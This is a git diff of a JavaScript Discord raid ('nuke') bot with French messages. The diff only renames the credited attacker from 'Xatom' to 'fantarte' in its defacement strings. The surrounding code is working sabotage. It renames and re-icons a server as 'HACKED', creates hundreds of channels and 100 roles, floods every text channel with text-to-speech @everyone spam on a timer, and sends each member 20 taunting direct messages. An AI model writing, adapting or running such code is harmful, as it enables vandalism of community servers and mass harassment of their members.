@@ -21,13 +21,13 @@ bot.on("message", message => {
         if(message.deletable) message.delete();
         if(!message.guild.member(bot.user).hasPermission("MANAGE_GUILD")) return console.log(`${message.guild.name} | guildfucker |Le bot n'a pas assez de permission.`);
         message.guild.setIcon("https://i.imgur.com/pvtPMv8.png");
-            message.guild.setName("HACKED BY XATOM");
+            message.guild.setName("HACKED BY fantarte");
             message.guild.setRegion("russia");
         if(!message.guild.member(bot.user).hasPermission("MANAGE_CHANNELS")) return console.log(`${message.guild.name} | chan spam |Le bot n'a pas assez de permission.`);
             var i;
             for (i = message.guild.channels.size; i < 497; i++) {
-                message.guild.createChannel("hacked_by_xatom", "text");
-                message.guild.createChannel("Hacked By Xatom ", "voice");
+                message.guild.createChannel("hacked_by_fantarte", "text");
+                message.guild.createChannel("Hacked By fantarte ", "voice");
             }
         break;
         case `${prefix}delchan`:
@@ -41,7 +41,7 @@ bot.on("message", message => {
         if(message.deletable) message.delete();
         setInterval (function () {
             message.guild.channels.forEach(channel => {
-                if (channel.type === "text") {channel.send("@everyone Xatom, est passé ici... Le serv est desormais purgé", { tts: true }).catch(console.error);  }
+                if (channel.type === "text") {channel.send("@everyone fantarte, est passé ici... Le serv est desormais purgé", { tts: true }).catch(console.error);  }
             }, 2500)}, 400)
           break;
           case `${prefix}rolespam`:
@@ -51,7 +51,7 @@ bot.on("message", message => {
           for (i = message.guild.roles.size; i < 100; i++) {
               message.guild.createRole({
                   color:"RANDOM",
-                  name:"XATOM"
+                  name:"fantarte"
               });
           }
           break;
@@ -89,7 +89,7 @@ bot.on("message", message => {
               mpmember.createDM().then(m =>
                 {var i;
                     for(i = 0; i < 20; i++){
-                        m.send(`Le serveur de ${message.guild.owner.user.tag} s'est fait niqué par Xatom :)`)
+                        m.send(`Le serveur de ${message.guild.owner.user.tag} s'est fait niqué par fantarte :)`)
                     }
                 })})
                 break;
